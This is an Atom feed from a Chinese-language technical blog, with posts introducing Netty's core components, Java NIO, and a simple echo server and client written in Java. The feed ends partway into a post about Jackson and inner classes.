<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Virgil Chen 的技术博客</title>
  
  <subtitle>Stay hungry, stay foolish</subtitle>
  <link href="https://virgilchen97.github.io/atom.xml" rel="self"/>
  
  <link href="https://virgilchen97.github.io/"/>
  <updated>2022-01-26T13:48:51.153Z</updated>
  <id>https://virgilchen97.github.io/</id>
  
  <author>
    <name>Virgil Chen</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Netty 基本组件</title>
    <link href="https://virgilchen97.github.io/2022/01/2022-01-26-13-48-27-Netty-%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6/"/>
    <id>https://virgilchen97.github.io/2022/01/2022-01-26-13-48-27-Netty-%E5%9F%BA%E6%9C%AC%E7%BB%84%E4%BB%B6/</id>
    <published>2022-01-26T05:48:27.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
    <content type="html"><![CDATA[<p>上篇笔记中，我们试着用Netty实现了一个简单的server和client，但是感觉却是盲人摸象，对其中用到的各种组件之间的关系一头雾水，现在我们就来大致了解一下 netty 中的各种组件和他们之间的关系</p><span id="more"></span><h2 id="基本组件"><a class="markdownIt-Anchor" href="#基本组件"></a> 基本组件</h2><h3 id="channel"><a class="markdownIt-Anchor" href="#channel"></a> Channel</h3><p>Java 网络编程中，<code>Socket</code> 是最最基本的组件，服务端需要通过 <code>bind()</code> 来绑定服务接口，通过 <code>read()</code> 和 <code>write</code> 来读取数据。<code>Channel</code> 则是 Netty 对于 <code>Socket</code> 的封装。简化了很多操作。</p><p><code>Channel</code> 本身是一个接口，在 Netty 中有多种他的实现。</p><h3 id="channelfuture"><a class="markdownIt-Anchor" href="#channelfuture"></a> ChannelFuture</h3><p>Netty 中的网络操作都是异步的，和 <code>Channel</code> 相关的操作也一样，<code>ChannelFuture</code> 就是一个结果的占位符，你可以通过 <code>addListener()</code> 方法来在添加一个监听器，处理操作完成后的结果。</p><h3 id="eventloop"><a class="markdownIt-Anchor" href="#eventloop"></a> EventLoop</h3><p>EventLoop 是netty对于事件处理的抽象。在上一篇笔记中，创建服务器时，我们做的第一件事就是创建 EventLoopGroup：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> EchoServerHandler echoServerHandler = <span class="keyword">new</span> EchoServerHandler();</span><br><span class="line">        EventLoopGroup group = <span class="keyword">new</span> NioEventLoopGroup(); <span class="comment">// 创建EventLoop</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>和 <code>EventLoop</code> 相关的一些对象关系如下：</p><ul><li><code>EventLoopGroup</code> 包含多个 <code>EventLoop</code> 。</li><li>每个 <code>EventLoop</code> 都会分配一个线程。</li><li>每个 <code>Channel</code> 都会在其生命周期内会被分配一个 <code>EventLoop</code> ，二者是多对一的关系</li></ul><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.581bg4f26q40.png" style="zoom:50%;" /><h3 id="channelhandler"><a class="markdownIt-Anchor" href="#channelhandler"></a> ChannelHandler</h3><p>实现了 <code>ChannelHandler</code> 接口的类中，基本就包含了我们的”业务代码“。你可以使用 ChannelHandler  对该 Channel 产生的事件做出响应，例如反序列化啊，解密啊，回写信息啊等等。</p><p><code>ChannelHandler</code> 有两个子类：<code>ChannelInboundHandler</code> 和 <code>ChannelOutboundHandler</code> ，顾名思义，一个是用于处理入站事件，即收到数据，而另外一个用于处理出站事件，即发送数据。</p><h3 id="channelpipeline"><a class="markdownIt-Anchor" href="#channelpipeline"></a> ChannelPipeline</h3><p>一个 ChannelPipeline 中包含了了一串 ChannelHandler。当一个事件发生时，这个事件会”流“过 ChannelPipeline 中的每一个 ChannelHandler，每一个 Handler 都可以对消息进行处理，或者将事件发送给下一个 Handler。</p><p>在一个 Channel 被创建时，都会被分配一个 ChannelPipeline。在我们进行 Bootstrap 时：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ServerBootstrap bootstrap = <span class="keyword">new</span> ServerBootstrap();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioServerSocketChannel.class)</span><br><span class="line">                    .localAddress(<span class="keyword">new</span> InetSocketAddress(port))</span><br><span class="line">                    .childHandler(<span class="keyword">new</span> ChannelInitializer&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                            ch.pipeline().addLast(echoServerHandler);</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;);</span><br></pre></td></tr></table></figure><p>会新建一个 <code>ChannelInitializer</code> 对象，当这个对象的 <code>initChannel</code> 方法被调用时，会将一系列的 ChannelHandler 加入到 Pipeline 里面去。</p><p>ChannalPipeline 会自动区分 ChannelInboundHandler 和 ChannelOutBoundHandler，并用他们分别处理入站/出站的数据。这个模式有点像 Spring 中的 Filter，都是责任链模式，每一个Handler都可以处理数据，或者将当前数据pass给下一个Handler：</p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.4a0x1vfxn2q0.png" alt="" style="zoom:50%;" /><p>以上就是Netty中的一些基本组件和设计。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上篇笔记中，我们试着用Netty实现了一个简单的server和client，但是感觉却是盲人摸象，对其中用到的各种组件之间的关系一头雾水，现在我们就来大致了解一下 netty 中的各种组件和他们之间的关系&lt;/p&gt;</summary>
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Netty" scheme="https://virgilchen97.github.io/tags/Netty/"/>
    
  </entry>
  
  <entry>
    <title>Netty Hello world</title>
    <link href="https://virgilchen97.github.io/2022/01/2022-01-07-08-54-19-Netty-Hello-world/"/>
    <id>https://virgilchen97.github.io/2022/01/2022-01-07-08-54-19-Netty-Hello-world/</id>
    <published>2022-01-07T00:54:19.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
    <content type="html"><![CDATA[<p>本文中，我们使用Netty实现一个简单的服务器和客户端：</p><ul><li>服务端收到什么，就发送回什么 （EchoServer）</li><li>客户端发送简单的字符串</li></ul><span id="more"></span><h2 id="echo-server"><a class="markdownIt-Anchor" href="#echo-server"></a> Echo Server</h2><p>首先，我们先编写服务器的 Handler，当收到连接请求，接收到字符串后，返回相同的字符串内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ChannelHandler</span>.Sharable <span class="comment">// 代表这个Handler的一个实例时可以被多个Channel共享的</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EchoServerHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次收到信息的时候就会调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteBuf in = (ByteBuf) msg;</span><br><span class="line">        System.out.println(<span class="string">&quot;Server received: &quot;</span> + in.toString(CharsetUtil.UTF_8)); <span class="comment">// 输出收到的内容</span></span><br><span class="line">        ctx.write(in); <span class="comment">// 将收到的内容写回去</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当信息接收完时会调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">channelReadComplete</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 刷出所有的数据，完成后关闭 Channel</span></span><br><span class="line">        ctx.writeAndFlush(Unpooled.EMPTY_BUFFER).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        cause.printStackTrace();</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 Handler 是处理收到的信息的，因此我们需要实现 <code>ChannelInboundHandler</code> 接口，定义连接建立，收到消息等等的行为。<code>ChannelInboundHandlerAdapter</code> 是 Netty 提供的对于 <code>ChannelInboundHandler</code> 接口最基本的实现。默认他会把所有事件都传递给 <code>ChannelPipeline</code> 中的下一个 Handler。在这里我们继承它，覆盖掉收到信息的几个行为，实现 Echo</p><p>定义好 Handler，我们需要编写启动服务器的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EchoServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> port; <span class="comment">// 端口</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EchoServer</span><span class="params">(<span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">60000</span>;</span><br><span class="line">        <span class="keyword">new</span> EchoServer(port).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> EchoServerHandler echoServerHandler = <span class="keyword">new</span> EchoServerHandler();</span><br><span class="line">        EventLoopGroup group = <span class="keyword">new</span> NioEventLoopGroup(); <span class="comment">// 创建EventLoop</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerBootstrap bootstrap = <span class="keyword">new</span> ServerBootstrap();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioServerSocketChannel.class)</span><br><span class="line">                    .localAddress(<span class="keyword">new</span> InetSocketAddress(port))</span><br><span class="line">                    .childHandler(<span class="keyword">new</span> ChannelInitializer&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                            ch.pipeline().addLast(echoServerHandler);</span><br><span class="line">                        &#125;;</span><br><span class="line">                    &#125;);</span><br><span class="line">            ChannelFuture future = bootstrap.bind().sync(); <span class="comment">// bind 绑定 Socket （同步）</span></span><br><span class="line">            future.channel().closeFuture().sync(); <span class="comment">// 关闭Channel （同步）</span></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            group.shutdownGracefully().sync(); <span class="comment">// 关闭服务器，释放所有资源</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中较为核心的部分是在操作 <code>ServerBootstrap</code> 对象：</p><ol><li><code>.group()</code> 绑定 EventLoopGroup</li><li><code>.channel()</code> 指定使用的是 NIO Channel</li><li><code>.localAddress()</code> 指定监听地址和端口</li><li><code>.childHandler()</code> 有客户端建立连接（Channel）后，为每一个建立的 Channel 指定 Handler。<code>ChannelInitializer</code> 是Netty提供的一种 <code>ChannelInboundHandlerAdapter</code> 的实现，来在Channel初始化时进行一些操作，这里我们在每个 Channel 建立后，添加上了我们自己的 Handler。</li></ol><p>至此，我们的 Echo 服务端就编写完毕</p><h2 id="客户端"><a class="markdownIt-Anchor" href="#客户端"></a> 客户端</h2><p>同样的，我们先编写 Handler</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EchoClientHandler</span> <span class="keyword">extends</span> <span class="title">SimpleChannelInboundHandler</span>&lt;<span class="title">ByteBuf</span>&gt; </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Channel 建立后，立刻发送 &quot;Netty rocks!&quot;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ctx.writeAndFlush(Unpooled.copiedBuffer(<span class="string">&quot;Netty rocks!&quot;</span>, CharsetUtil.UTF_8));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收到信息后打印出来</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">channelRead0</span><span class="params">(ChannelHandlerContext ctx, ByteBuf msg)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Client received: &quot;</span> + msg.toString(CharsetUtil.UTF_8));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常处理</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exceptionCaught</span><span class="params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        cause.printStackTrace();</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端我们继承的是 <code>SimpleChannelInboundHandler</code>，这也是Netty提供的一种 <code>ChannelInboundHandlerAdapter</code> 的实现，他简化到只会处理某种特定类型的消息，在我们的例子里是 <code>ByteBuf</code> 类型，而且在读取后，会立刻释放该信息。在我们的Server中，由于需要把信息返回个客户端，因此是不能在读取后立刻释放的。</p><p>接下来是客户端的启动代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EchoClient</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EchoClient</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.host = host;</span><br><span class="line">        <span class="keyword">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">new</span> EchoClient(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">60000</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        EventLoopGroup group = <span class="keyword">new</span> NioEventLoopGroup();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Bootstrap bootstrap = <span class="keyword">new</span> Bootstrap();</span><br><span class="line">            bootstrap.group(group)</span><br><span class="line">                    .channel(NioSocketChannel.class)</span><br><span class="line">                    .remoteAddress(<span class="keyword">new</span> InetSocketAddress(host, port))</span><br><span class="line">                    .handler(<span class="keyword">new</span> ChannelInitializer&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initChannel</span><span class="params">(SocketChannel ch)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                            ch.pipeline().addLast(<span class="keyword">new</span> EchoClientHandler());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">            ChannelFuture f = bootstrap.connect().sync();</span><br><span class="line">            f.channel().closeFuture().sync();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            group.shutdownGracefully().sync();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行"><a class="markdownIt-Anchor" href="#运行"></a> 运行</h2><p>在idea中，我们首先启动Server</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.10ufahs8kbbk.png" alt="" /></p><p>然后启动 Client</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.317s5vov2ma0.png" alt="" /></p><p>Client 发送了 “Netty rocks!” 后，接收到了服务器返回的相同字符串，退出了。此时看服务器</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.5bf0p9ny9sg0.png" alt="" /></p><p>提示收到了&quot;Netty rocks!&quot;。如果我们多次启动客户端，服务端也会多次收到一样的字符串：</p><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.3rww0qnbnmk0.png" alt="" /></p><p>这样，一个非常简单的 Netty 服务器和客户端就完成了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文中，我们使用Netty实现一个简单的服务器和客户端：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端收到什么，就发送回什么 （EchoServer）&lt;/li&gt;
&lt;li&gt;客户端发送简单的字符串&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Netty" scheme="https://virgilchen97.github.io/tags/Netty/"/>
    
  </entry>
  
  <entry>
    <title>Netty 简介</title>
    <link href="https://virgilchen97.github.io/2022/01/2022-01-06-14-41-45-Netty-%E7%AE%80%E4%BB%8B/"/>
    <id>https://virgilchen97.github.io/2022/01/2022-01-06-14-41-45-Netty-%E7%AE%80%E4%BB%8B/</id>
    <published>2022-01-06T06:41:45.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Netty is a NIO client server framework which enables quick and easy development of network applications such as protocol servers and clients.</p></blockquote><p>Netty 使用了 Java NIO API 来实现异步的，事件驱动的高性能网络编程框架，本文我们一起学习 Netty 的基本概念。</p><span id="more"></span><h1 id="java-网络编程"><a class="markdownIt-Anchor" href="#java-网络编程"></a> Java 网络编程</h1><p>很早以前的 Java 只支持<strong>阻塞</strong>式的网络编程，通常为了编写一个网络服务，你需要</p><ol><li>使用 <code>accept()</code> 来等待客户端发来连接请求，收不到请求便一直阻塞</li><li>使用 <code>BufferedReader</code> 和 <code>PrintWriter</code> 来操作 <code>accept()</code> 返回的socket。<code>BufferedReader</code> 等待读取客户端发来的数据时，也是一直阻塞的。</li></ol><p>这样做，服务器一次只能处理一个请求。想要响应多个请求，那么对于每一个 socket，我们可以在 <code>accept()</code> 以后开一个新的线程去处理，但是这么做有很多的缺点</p><ul><li>大部分线程都因为等待输入被阻塞</li><li>连接数多时，会创建很多的线程，创建线程有开销</li><li>线程太多，CPU 频繁 context-switch 影响性能</li></ul><p>我们需要一种更高性能的处理网络IO的方法</p><h2 id="java-nio-non-blocking-io"><a class="markdownIt-Anchor" href="#java-nio-non-blocking-io"></a> Java NIO (Non-blocking I/O)</h2><p>为了解决上述问题，Java 为我们提供了 NIO 的 API。可以让我们注册多个socket，在某个socket有数据需要读取或写入时，由系统来通知我们。</p><h3 id="selectors"><a class="markdownIt-Anchor" href="#selectors"></a> Selectors</h3><p><img src="https://cdn.jsdelivr.net/gh/VirgilChen97/image-host@master/images/image.6m5rp1sagbs0.webp" alt="" /></p><p><code>selector</code> 是 NIO 实现的关键，它使用操作系统的 API 来告诉我们那些Socket现在需要被读写，所以我们不再需要多个线程阻塞式的等待数据。一个线程就可以处理多个socket。但是 Java NIO 的 API 十分复杂，因此我们需要一个成熟的框架来让我们能够更轻松的使用 NIO，这就是 Netty。</p><h2 id="netty-核心组件"><a class="markdownIt-Anchor" href="#netty-核心组件"></a> Netty 核心组件</h2><p>Netty 包含如下核心组件：</p><ul><li>Channels</li><li>Callbacks</li><li>Futures</li><li>Events and handler</li></ul><h3 id="channels"><a class="markdownIt-Anchor" href="#channels"></a> Channels</h3><blockquote><p>an open connection to an entity such as a hardware device, a file, a<br />network socket, or a program component that is capable of performing<br />one or more distinct I/O operations, for example reading or writing.</p></blockquote><p>基本代表了一条连接，会发送/接收数据，可以开启或关闭</p><h3 id="callbacks"><a class="markdownIt-Anchor" href="#callbacks"></a> Callbacks</h3><p>回调（Callback）是在一个事件发生的时候，针对该事件执行的函数，可以理解该事件就是函数的入参。在Netty中，通过实现 <code>ChannelHandler</code> 接口，可以实现自定义的回调函数。书上的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConnectHandler</span> <span class="keyword">extends</span> <span class="title">ChannelInboundHandlerAdapter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Client &quot;</span> + ctx.channel().remoteAddress() + <span class="string">&quot; connected&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在有新连接建立时，<code>channelActive</code> 会被调用，打印出一些信息</p><h3 id="futures"><a class="markdownIt-Anchor" href="#futures"></a> Futures</h3><p>Future 和 Callback 较为类似，互相补充。Future 提供了一种告知某个操作是否完成的方法。执行一个异步方法时，方法会立刻返回一个 Future 作为方法结果的占位符，调用者可以通过 Future 对象来判断异步操作是否完成，并在操作完成后通过 Future 获取结果。</p><p>但是通过不断地轮询 Future 是否 ready 也是很麻烦的。因此 Netty 中的 <code>ChannelFuture</code> 允许我们注册一个或多个 <code>ChannelFutureListener</code> 当 Future 的操作完成时，Listener 便会使用其中定义的方法对 Future 的结果进行处理。</p><h3 id="events-and-handlers"><a class="markdownIt-Anchor" href="#events-and-handlers"></a> Events and Handlers</h3><p>Netty 通过产生各种事件来告诉我们某个操作的状态变化，而我们针对性的使用Handler来对相应变化。</p><p>Netty 讲事件分为入站事件和出站事件，入站事件可能是 新的连接/收到数据/发生错误，出站事件可能是 发起连接/写数据等等。这些事件都可以被用户定义的 Handler 捕获到，并作出响应。</p><p>Netty 本身也提供了很多现成的 Handler 给我们使用，例如 HTTP，SSL 的 Handler 等</p><h2 id="总览"><a class="markdownIt-Anchor" href="#总览"></a> 总览</h2><p>Netty 中，Futures，Callbacks 和 Handlers 为我们提供了对任何网络事件进行异步处理的能力，我们不需要关心事件何时发生，如何发生，只需要为事件定义好 Handler 或 callback，或者对产生的Future进行处理，而不需要关心网络操作过程中的任何细节。</p><p>而 Netty 中的 Event 和 Event Loop 则把 Java 中的 Selector 包装了起来。每一个 Channel 都会 被分配一个 EventLoop，EventLoop 则会注册各种事件，将需要的事件发送给指定的Handler，进行后续处理等等。</p><p>Netty 对于 NIO 的抽象让我们不再需要担心线程同步，事件分发等问题，我们只需要定义我们关心那些数据，对这些数据需要做什么处理，将处理好的数据发送到那里去就好了。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Netty is a NIO client server framework which enables quick and easy development of network applications such as protocol servers and clients.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Netty 使用了 Java NIO API 来实现异步的，事件驱动的高性能网络编程框架，本文我们一起学习 Netty 的基本概念。&lt;/p&gt;</summary>
    
    
    
    <category term="技术学习" scheme="https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Netty" scheme="https://virgilchen97.github.io/tags/Netty/"/>
    
  </entry>
  
  <entry>
    <title>Jackson和内部类</title>
    <link href="https://virgilchen97.github.io/2022/01/2022-01-04-08-40-07-Jackson%E5%92%8C%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    <id>https://virgilchen97.github.io/2022/01/2022-01-04-08-40-07-Jackson%E5%92%8C%E5%86%85%E9%83%A8%E7%B1%BB/</id>
    <published>2022-01-04T00:40:07.000Z</published>
    <updated>2022-01-26T13:48:51.153Z</updated>
    
